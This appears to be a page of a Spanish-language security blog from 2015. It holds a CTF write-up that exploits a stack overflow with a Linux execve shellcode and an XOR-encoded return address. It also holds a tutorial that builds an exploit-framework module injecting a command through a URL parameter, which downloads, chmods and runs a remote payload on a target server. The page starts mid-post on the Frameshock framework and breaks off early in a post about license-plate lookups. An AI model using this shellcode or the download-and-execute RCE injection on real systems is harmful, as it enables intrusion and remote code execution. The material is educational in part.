iniciativa de lograr una plataforma solida y robusta para el trabajo de un pentester.<br /><br />Recuerden el software libre es de todos, cualquiera lo puede usar y modificar, pero así mismo el mantenimiento del software libre es brindado por los mismos usuarios a todos aquellos que se hayan interesado en Frameshock les pedimos que nos ayuden a mejorarlo, desarrollando o detectando fallos!<br /><br />Entrevista:<br /><a href="http://www.enfoqueseguro.com/frameshock-desde-argentina-para-el-mundo/2015/02/26/">http://www.enfoqueseguro.com/frameshock-desde-argentina-para-el-mundo/2015/02/26/</a><br /><br />Respuesta actualizada sobre las dependencias básicas de Frameshock:</span></span>Las dependencias que de momentos requiere el núcleo de Frameshock son:</div><div style="text-align: left;"><br />[*] Tabulate</div><div style="text-align: left;">[*]<a href="https://www.blogger.com/null" name="cl-4"></a> colorama <a href="https://www.blogger.com/null" name="cl-5"></a>&nbsp;</div><div style="text-align: left;">[*] shodan <a href="https://www.blogger.com/null" name="cl-6"></a>&nbsp;</div><div style="text-align: left;">[*] html2text<br /><br />Demás esta decirle a todos los desarrolladores independientes de módulos que tienen la libertad de incluir cualquier dependencia que requieran siempre y cuando se realice un script de instalación de dependencias del mismo.</div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/02/18/level4-pwned/">Level4 Pwned!</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-02-18T14:30:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/DAy7Arn.jpg?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/DAy7Arn.jpg?1" height="180" width="320" />&nbsp;</a></div><br /><div style="text-align: right;"><b>by [Q]3rV[0]</b></div><br />Últimamente le estuve dedicando tiempo al CTF de&nbsp;<a href="http://ringzer0team.com/">ringzer0team</a> que cuenta con una extensa lista de retos de todo tipo: <b>Exploiting, Informática forense, web,</b><br /><a name='more'></a><b> Cracking, Escalacion de privilegios en linux, Criptografia, Javascript,Inyecciones SQL</b>, etc.<br />&nbsp;Como consejo los invito a que se pasen por la web y le den masa a muchos de los desafíos que existen, ya que además de pasar un buen rato,&nbsp; se pueden llevar a casa unos buenos <b>skills</b> mejorados en el ámbito de la seguridad.<br /><br />El ultimo reto que realice tiene por nombre <b>"Level4 Pwnage Linux Level Up"</b>, esta dentro de una serie de desafíos de exploiting en linux en el que tendremos que ir rebalsando el vaso para ir ganando privilegios, comenzando por supuesto a partir del primer nivel.<br /><br /><br /><h2 style="text-align: center;">Level4 </h2><br />&nbsp;Una vez dentro, en el directorio <b>/levels</b> encontramos el binario level4 con su respectivo source, antes que nada vamos a ver como reacciona al pasaje de argumentos. Aclaro que <b>ASLR esta a 0</b> en el servidor y los binarios no presentan ninguna protección como <b>NX, CANARY</b>, etc.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-XS6aSzpbW_A/VOTjTGkensI/AAAAAAAAAYw/n4eEI0HBo20/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-XS6aSzpbW_A/VOTjTGkensI/AAAAAAAAAYw/n4eEI0HBo20/s1600/1.png" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br /><br />Ok, ingreso una <b>A</b> como argumento y recibo una salida diferente tras cada ejecución, vamos a ver si podemos tocar el <b>EIP</b>.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-5iuIvh7Qj9Q/VOTkFc4aaFI/AAAAAAAAAY4/2NwPWgEqPEg/s1600/2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-5iuIvh7Qj9Q/VOTkFc4aaFI/AAAAAAAAAY4/2NwPWgEqPEg/s1600/2.png" /></a></div><br />Logramos sobrescribir <b>EIP</b>, pero aparentemente se pinta con un valor diferente a A, ahora si creo que es momento de pispear el source para ver que anda pasando.<br /><br /><br /><pre class="brush: c">/* <br /> This garbage has been written by Mr.Un1k0d3r 2014<br />*/<br /><br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br /> char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(rand());<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /><br /></pre><br />En esta función es donde se da el <b>truco</b>.<br /><br /><br /><pre class="brush: c">void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(rand());<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /></pre><br />Lo que sucede es que cada carácter que es ingresado al buffer sufre una operación <b>XOR de su equivalente en ASCII</b>, pero&nbsp; como vemos la variable <b>key</b> almacena valores aleatorios mediante la función <b>rand()</b> por lo que en cada ejecución la cadena que le pasemos va a presentar un output diferente o no, si es que la key se vuelve a repetir.<br /><br />Analicemos un poco que es lo que hace el operador <b>^ </b>(XOR)<br /><br /><br /><h2 style="text-align: center;">XOR btwise&nbsp; </h2><div style="text-align: left;"><br /><b>XOR</b> es un operador que <b>trabaja a nivel de bits</b>, su función es simple, toma dos enteros y arroja una salida.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Supongamos que tenemos la siguiente linea.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><h3><b>26 ^ 30</b></h3></div><div style="text-align: left;"><br /></div><b>XOR</b> tomara ambos valores en binario y devolverá un 0 si ambos pares son iguales o 1 si son diferentes.<br /><br /><h3>26&nbsp;&nbsp; =&nbsp;&nbsp; 11010</h3><h3>30&nbsp;&nbsp; =&nbsp;&nbsp; 11110</h3><h3>out =&nbsp;&nbsp; 00100&nbsp; =&nbsp; 4 </h3><br />Entonces si realizo la siguiente operación<br /><br /><h3><b>4 ^ 30</b></h3><br />El resultado seria <b>26</b><br /><br />Comprendiendo ahora como trabaja <b>XOR</b> podemos codificar la dirección de memoria que sobrescribirá <b>EIP</b>, con un valor determinado y <b>esperar a que este se repita para que se produzca la decodificación</b>.<br /><br /><br /><br /><h2 style="text-align: center;">&nbsp;Forjando el exploit </h2><div class="separator" style="clear: both; text-align: center;"></div><br />En el server opte por almacenar el <b>NOPSLED+SHELLCODE</b> dentro de una variable de entorno y luego obtener la dirección en memoria de dicha variable con la que invadiremos el <b>EIP</b>.<br /><br /><br /><pre class="brush: bash">level4@rzt-bin01:~$ export SHELLCODE=$(python -c 'print "\x90"*200+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')<br /></pre><br />La ubicación de <b>SHELLCODE</b> podemos divisarla con el siguiente programita en c.<br /><br /><br /><pre class="brush: c">#include &lt;stdlib.h&gt;<br /><br />int main()<br />{<br />    char *addr;<br />    addr = getenv("SHELLCODE");<br />    printf("SHELLCODE is at %p\n", addr);<br />    exit(0);<br />}<br /><br /></pre><br /><br /><pre class="brush: bash">level4@rzt-bin01:~$ /var/tmp/./findvar<br />SHELLCODE is at 0xbffff876<br /></pre><br />Una vez que obtenemos la dirección la codificamos a&nbsp; <b>XOR ^ 47 </b><br /><br /><br />Para no tener que andar codeando nada nuevo,&nbsp; simplemente aproveche el source del binario y le deje el valor de la variable <b>key</b> fijo en <b>47</b>, que es el entero que usaremos para codificar nuestra dirección y con suerte esperemos que se repita enseguida.<br /><br /><br /><pre class="brush: c">/* <br /> This garbage has been written by Mr.Un1k0d3r 2014<br />*/<br /><br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br /> char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    char key = (unsigned char)(47);<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /><br /></pre><br /><br />Lo compilamos en local<br /><br /><br /><pre class="brush: bash">gcc -o xorencode -fno-stack-protector -mpreferred-stack-boundary=2 level4xor.c<br /></pre><br /><br />Y codificamos <b>0xbffff876</b><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><b><a href="http://4.bp.blogspot.com/-W06JZt8Allo/VOUA6XnHEDI/AAAAAAAAAZY/IhLUzN4FZak/s1600/4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-W06JZt8Allo/VOUA6XnHEDI/AAAAAAAAAZY/IhLUzN4FZak/s1600/4.png" /></a></b></div><br /><br />Por lógica si volviéramos a codificar <b>0x59d7d090</b> el valor tendría que ser igual a <b>0xbffff876</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-4tXD71t62G8/VOUFBXhq4mI/AAAAAAAAAZk/YIfbtbK0ewU/s1600/5.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-4tXD71t62G8/VOUFBXhq4mI/AAAAAAAAAZk/YIfbtbK0ewU/s1600/5.png" /></a></div><br />Solo resta armar el exploit y darle a mano hasta que la key obtenga el valor <b>47</b> cosa que no es imposible pero puede llevarnos algún tiempito o no, <b>dependera de la suerte con la que corramos!</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-DX2yvpUjb6g/VOUGRHy7jZI/AAAAAAAAAZs/xEYaRrg1eNs/s1600/6.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-DX2yvpUjb6g/VOUGRHy7jZI/AAAAAAAAAZs/xEYaRrg1eNs/s1600/6.png" /></a></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-AKA7dfPcUQ8/VOUJiwhBLaI/AAAAAAAAAaA/b_1571kmq1Q/s1600/15302056.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-AKA7dfPcUQ8/VOUJiwhBLaI/AAAAAAAAAaA/b_1571kmq1Q/s1600/15302056.jpg" /></a></div><br /><h2 style="text-align: center;">Dos dias despues...</h2><div style="text-align: left;"><br /></div><div style="text-align: left;">No, es joda! XD, luego de media hora intentando el exploit termino por tirarme el prompt de la victoria, el <b>EIP</b> por fin se tiño con la dirección donde se hallaba nuestro <b>shellcode</b> y pude tomar el <b>setuid</b> de level5!.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-aqko-TEkmP0/VOUHmKboBUI/AAAAAAAAAZ0/3vwX70zGK8c/s1600/7.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-aqko-TEkmP0/VOUHmKboBUI/AAAAAAAAAZ0/3vwX70zGK8c/s1600/7.jpg" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Y se preguntaran por que no programe un script que me automatice el trabajo??...<b>sangre sudor y gloria es mi respuesta</b>.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/02/07/programa-tu-modulo-para-frameshock/">Programa Tu Modulo Para Frameshock</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-02-07T12:44:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/8KCwaUh.jpg?3" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/8KCwaUh.jpg?3" height="250" width="400" /></a></div><div style="text-align: center;"><br /></div><br /><b>&nbsp;by [Q]3rV[0]</b></div><div style="text-align: right;"><br /></div>Recientemente y de la mano de mi amigo<b> hdbreaker</b> salio a la luz un nuevo framework de explotacion llamado <b>Frameshock</b>, el cual promete ser una<br /><a name='more'></a>herramienta que a futuro, llegue a competir con el imponente <b>Metasploit</b>. Lo mejor de esta tool es que esta basada completamente en python y el desarrollo de exploits, auxiliares, etc se hace tremendamente sencillo debido a la manera en que trata los modulos.<br /><br />En fin, basta de chicharas y vamos a evocarnos a lo que el titulo llama. Antes de proseguir con el resto del tutorial, se tiene en cuenta que el lector cuenta con conocimientos de POO en el lenguaje python.<br /><br /><b>*** ADVERTENCIA ***</b> Si estas leyendo esto y todavía no te encontras  familiarizado con el framework, podes ver el siguiente <a href="http://www.securitysignal.tk/2015/02/frameshock-al-descubierto.html">enlace</a><br /><br /><h2 style="text-align: center;">Estructura de los módulos </h2><h3 style="text-align: left;"></h3><span style="font-weight: normal;">La estructura de los módulos es la siguiente, y lo único a respetar durante el desarrollo.</span><br /><br /><pre class="brush: py"># -*- coding : utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br /><br />class module(config):<br /><br />    def __init__(self):<br />        self.config=config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br /><br />    def preExecution(self):<br />        while 1:<br />            ################Aca se definen las opciones y se cargan los argumentos################<br /><br /><br /><br />    def exploit(self):<br />        if len(self.targets)&gt;0:<br />            for target in self.targets:<br />                print "Attack "+target[1]<br />                ################Aca va el exploit################<br />        else:<br />            print "No hay targets"<br /><br />################Aca va el metodo que contiene el exploit################<br />    def test(self):<br />        print "Attack Test"<br />########################################################################<br /><br />##########Se inicia el modulo###########<br />start=module()<br />########################################<br /></pre><br />Como se ve:<br /><br /><ul><li>Se importan módulos necesarios como <b>sys</b> para agregar el dir base al PATH de python: <b>sys.path.append('.')</b></li></ul><ul><li>Se importa el modulo <b>config</b> el cual contiene ciertos métodos que nos proveerán de los datos que configuramos con la opción <b>config en el prompt de frameshock</b>. Además es necesario para trabajar con <b>shodan y la db</b> si es que lo necesitamos.</li></ul><ul><li>Se importa <b>tabulate</b>, el cual lo usaremos para mostrar informacion en forma de tabla como por ejemplo los targets seteados.</li></ul><br /><h2 style="text-align: center;">La clase module()</h2><h3 style="text-align: center;">&nbsp;</h3><div style="text-align: left;">La clase module contiene tres métodos,<b> </b>en<b> __init__</b>:</div><ul><li>Se inicializa el objeto <b>config</b> y se llama a dos métodos dentro de <b>config</b></li></ul><ul><li><b>getCursor()</b></li><li><b>getCon()</b></li></ul><div style="text-align: left;"><br />Necesarios para trabajar con la db <b>sqlite3</b>, como dije anteriormente nos servirán para hacer uso de <b>shodan</b>, pero en este apartado no se hará referencia al mismo, aunque de igual manera se mencionaran.</div><ul><li>Se crea una lista vacía <b>self.targets=[]</b> que almacenara los objetivos que seleccionemos en modo manual.</li></ul><ul><li>Por ultimo se llama al método <b>preExecution.</b></li></ul><br /><div style="text-align: center;"><h2><b>preExecution()</b></h2></div><ul></ul><br />Acá indicaremos la opciones que contendrá el modulo y cargaremos los argumentos que son pasados a través de esas opciones, tales como el target objetivo, la opción de arranque del modulo, etc. Eso va en los parámetros que necesite recibir nuestro modulo, si desean también pueden incluir una opción para desplegar información acerca del mismo, o datos del autor.<br />&nbsp;Comencemos! y a partir de acá, siéntanse libres de codear a su antojo, para nuestro ejemplo voy a portar como modulo de Frameshock un simple script que explota un rce.<br /><br /><div style="text-align: left;"></div><pre class="brush: py">#!/usr/bin/python<br /><br />import urllib2<br />import sys<br /><br />def rce(target):<br />    while 1:<br />        command=raw_input("$&gt; ")<br />        w=urllib2.urlopen(target+"www.google.com|"+command)<br />        print w.read()<br /><br />rce(sys.argv[1])<br /></pre><br /><div style="text-align: center;"><h3><b>let's go!</b></h3></div><br />Arranquemos por definir la opción <b>help</b>. Por comodidad respecto a la sintaxis se optara por utilizar la misma que msf, pero no es algo indispensable.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-Fy3uRAxgfLM/VNZuP8UKYxI/AAAAAAAAAXM/SfkPBSL21tA/s1600/pre1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-Fy3uRAxgfLM/VNZuP8UKYxI/AAAAAAAAAXM/SfkPBSL21tA/s1600/pre1.png" height="174" width="640" /></a></div><br /><br />Ahora continuemos con el resto de las opciones necesarias para nuestro modulo.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-BUIJ0Wy-xrA/VNZuu5tMZVI/AAAAAAAAAXU/zy1ca5_c_TU/s1600/preexecu2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-BUIJ0Wy-xrA/VNZuu5tMZVI/AAAAAAAAAXU/zy1ca5_c_TU/s1600/preexecu2.png" height="412" width="640" /></a></div><br /><br />Sencillo no?, no hace falta explicar mucho, el código habla por si solo.<br /><br />Para obtener el objetivo, hacemos un split a la cadena <b>set target</b>, tomamos el indice 2 y luego hacemos un append para ingresar los datos dentro de <b>self.targets</b>.<br />&nbsp; <br />Para desplegar los objetivos lo hacemos con tabulate, por cuestiones de estetica, lo dije antes y lo vuelvo a decir, <b>SIÉNTANSE LIBRES!</b><br /><br />Si la opción elegida es <b>exploit</b> invoca el metodo <b>exploit()</b> que lo trataremos en el siguiente paso.<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /><h2 style="text-align: center;">exploit()</h2><h2 style="text-align: center;"></h2><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-3WSHvxRJY1I/VNVTUFvGHPI/AAAAAAAAAWU/cg3LMPn1JwY/s1600/no_me_digas_by_rober_raik-d4dt7n7.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-3WSHvxRJY1I/VNVTUFvGHPI/AAAAAAAAAWU/cg3LMPn1JwY/s1600/no_me_digas_by_rober_raik-d4dt7n7.png" height="532" width="640" /></a></div><br /><div style="text-align: left;">Tenemos dos caminos, utilizar algún <b>payload provisto por Frameshock</b>, o bien realizar una conexión directa.<br /><br />Como el <b>handler</b> del framework no esta el divino botón optaremos por la primera.<br /><br />Definiremos el método que contendrá el exploit e importaremos las librerias necesarias. </div><div style="text-align: left;"><br /></div><pre class="brush: py">def rce(self, target):<br />        command="wget%20http://"+self.config.getUrlInjector()+"%20-O%20"+self.config.getInjectorName()+"%3Bchmod%20755%20"+self.config.getInjectorName()+"%3Bpython%20"+self.config.getInjectorName()<br />        urllib2.urlopen(target+"www.google.com%7C"+command) </pre><br />Hagamos un párate y pongamos un par de cosas en remojo.<br /><br /><ul><li><b>self.config.getUrlInjector()</b> : Retorna la url del payload que hemos seteado desde frameshock</li></ul><ul><li><b>self.config.getInjectorName()</b> : Nos devolverá el nombre del payload elegido.</li></ul><br />Entonces el metodo rce() lo único que hace es descargar nuestro payload en el servidor remoto, darle permisos de ejecución y <b>lanzarlo contra nuestro handler</b>.<br /><br /><br /><pre class="brush: py">command="wget http://"+self.config.getUrlInjector()+" -O "+self.config.getInjectorName()+";chmod 755 "+self.config.getInjectorName()+";python "+self.config.getInjectorName()<br /></pre><br />Lo llamamos desde <b>exploit()</b> y nos disponemos a probar nuestro modulo, quedando de la siguiente manera.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-JZs3v7Bivto/VNaxNBtZXzI/AAAAAAAAAYA/E-3bTc_yDgM/s1600/exploitcall.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-JZs3v7Bivto/VNaxNBtZXzI/AAAAAAAAAYA/E-3bTc_yDgM/s1600/exploitcall.png" height="152" width="640" /></a></div><br /><br /><br /><pre class="brush: py"># -*- coding : utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br />import urllib2<br /><br />class module(config):<br /><br />    def __init__(self):<br />        self.config=config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br /><br />    def preExecution(self):<br />        while 1:<br />            ################Aca se definen las opciones y se cargan los argumentos################<br />            opcion=raw_input("&gt; ")<br /><br />            if opcion=="help":<br />                print("set target &lt;TARGET&gt; -&gt; Setea el target manualmente")<br />                print("exit -&gt; Cierra el modulo")<br />                print("show targets -&gt; Muestra los targets seteados")<br />                print("clear targets -&gt; Elimina los targets")<br />                print("exploit -&gt; Inicia el modulo de ataque")<br /><br />            elif opcion.find("set target")!=-1:<br />                target=opcion.split(' ')[2]<br />                self.targets.append((0, target, "Modulo para explotar un RCE", "RCE"))<br /><br />            elif opcion=="exit":<br />                exit(0)<br /><br />            elif opcion=="show targets":<br />                if len(self.targets)&gt;0:<br />                    print tabulate(self.targets, ["ID", "TARGET", "DESCRIPCION", "MODULO"], tablefmt="grid")<br />                else:<br />                    print "No hay targets seteados"<br /><br />            elif opcion=="clear targets":<br />                self.targets=[]<br /><br />            elif opcion=="exploit":<br />                self.exploit()<br /><br /><br />    def exploit(self):<br />        if len(self.targets)&gt;0:<br />            for target in self.targets:<br />                print "Attack "+target[1]<br />                ################Aca va el exploit################<br />                self.rce(target[1])<br />        else:<br />            print "No hay targets"<br /><br />################Aca va el metodo que contiene el exploit################<br />    def rce(self, target):<br />        command="wget%20http://"+self.config.getUrlInjector()+"%20-O%20"+self.config.getInjectorName()+"%3Bchmod%20755%20"+self.config.getInjectorName()+"%3Bpython%20"+self.config.getInjectorName()<br />        urllib2.urlopen(target+"www.google.com%7C"+command)<br />########################################################################<br /><br />##########Se inicia el modulo###########<br />start=module()<br />########################################<br /><br /></pre>Antes que nada, lo guardaremos en el directorio <b>/FrameShock/Modules</b> respetando la regla del nombre.<br /><br /><b>numero_nombremodulo.py</b><br /><br />Por ejemplo:<b> </b><br /><br />Si tenemos los siguiente módulos (<b>1_moduloprueba.py, 2_moduloprueba.py, 3_moduloprueba.py</b>), Lo agregaremos como <b>4_rce.py</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-iKle3OWpmxg/VNVggASqhBI/AAAAAAAAAWs/-ibGmZZz7rE/s1600/15127416.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-iKle3OWpmxg/VNVggASqhBI/AAAAAAAAAWs/-ibGmZZz7rE/s1600/15127416.jpg" height="640" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div style="text-align: center;">Estamos listos para cargar nuestro modulo de prueba.</div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-HcbKH6dgzWA/VNZ1yQ5FxFI/AAAAAAAAAXk/Uw_DDHL1O9s/s1600/attack.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-HcbKH6dgzWA/VNZ1yQ5FxFI/AAAAAAAAAXk/Uw_DDHL1O9s/s1600/attack.png" height="422" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div style="text-align: center;"><b>BOOM! explotado con exito el rce!</b></div><br />Cabe resaltar para terminar, que en el directorio&nbsp;<b> /FrameShock/ExampleModule</b> contamos con un modulo de ejemplo para comenzar a programar desde ahí.<br /><br /><br /><pre class="brush: py"># -*- coding: utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br /><br />class module(config):<br /><br /><br />####Init configuration####<br />    def __init__(self):<br />        self.config = config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br />##########################<br /><br />####User define information####<br />    def preExecution(self):<br />        while(True):<br />            option = raw_input("&gt; ")<br />            if(option=="exit"):<br />                exit(0)<br /><br />            if(option=="help"):<br /><br />                print("set target URL:PORT --&gt; Manual Target")<br />                print("clear targets       --&gt; Show Targets in module")<br />                print("show targets        --&gt; Clear Targets in module")<br />                print("use shodan          --&gt; Targets from Shodan Results")<br />                print("exploit             --&gt; Start atack")<br />                print("exit                --&gt; Close Module")<br /><br />            if(option.find("set target")&gt;-1):<br />                data = option.split(" ")<br />                data = data[2].split(":");<br />                target = data[0]<br />                port = data[1]<br />                self.targets.append((0,target,port,"Manual","null"))<br /><br />            if(option.find("use shodan")&gt;-1):<br />                self.targets=self.config.getTargets();<br /><br />            if(option=="clear targets"):<br />                self.targets=[]<br />                print("Clear Done")<br /><br />            if(option=="show targets"):<br />                if(len(self.targets)!=0):<br />                        print tabulate(self.targets, ["id", "IP", "PORT", "Description", "Vulnerable Module"], tablefmt="grid")<br />                else:<br />                    print "No targets"<br /><br />            if(option=="exploit"):<br />                self.exploit()<br />###################################<br /><br />###Exploit c0de###<br />    def exploit(self):<br />        if(len(self.targets)!=0):<br />            for target in self.targets:<br />                ###YOUR EXPLOIT CODE HERE###<br />                print "Atack "+target[1]+":"+target[2]<br />        else:<br />            print "No targets found";<br /><br />####def custom user functions (calleable from exploit())####<br />    def testFunctions(self):<br />        print "Atack test"<br />#############################################################<br /><br />#####Init Module#####<br />start = module()<br />#####################<br /></pre><br />Saludos! y Happy Frameshock Hacking!</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <!-- Now we're back to normal posts. Note the links used under href in both headers.-->
        <h1 class="entry-title"><a href="/blog/2015/02/05/quien-te-choco-hackeado-patentes/">¿Quién Te Choco? Hackeando Patentes</a></h1>
      
    
    
      <p class="meta">
        








  


<time datetime="2015-02-05T19:19:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-Kaj4GWRPSTo/VNQZifsmy3I/AAAAAAAAAT8/PolYUA2eVOU/s1600/test.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-Kaj4GWRPSTo/VNQZifsmy3I/AAAAAAAAAT8/PolYUA2eVOU/s1600/test.png" height="380" width="640" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Hace algún tiempo tuve la mala fortuna de estar envuelto en un accidente de trafico algo grave, donde yo por viajar en moto, me lleve la peor parte. Totalmente en contra a lo que esperaba, el responsable del accidente no se detuvo a asistirme, por su parte prefirió darse a la fuga.<br /><br />Luego de todos los protocolos médicos, unos cuantos moretones y tras no encontrar respuestas en la policía por falta de testigos, decidí comenzar una búsqueda personal de identificación del vehículo con el único dato que había logrado divisar en el golpe. </div><div style="text-align: center;"><span style="color: red;"><b>###su numero de patente###</b></span></div><div style="text-align: center;"></div><div style="text-align: left;"><span style="color: red;"></span>Por cuestiones de confidencialidad no utilizare la patente real del agresor sino una que alcance a leer en el registro del automotor mientras realizaba los tramites del seguro.</div><div style="text-align: left;"></div><div style="text-align: center;"><h2><u><b>¿La pregunta? </b></u></h2></div><div style="text-align: left;">Existe algún sistema que me permita consultar los datos y el estado de un vehículo que transita en la calle actualmente? La respuesta es si!</div><div style="text-align: left;"><br /></div><div style="text-align: 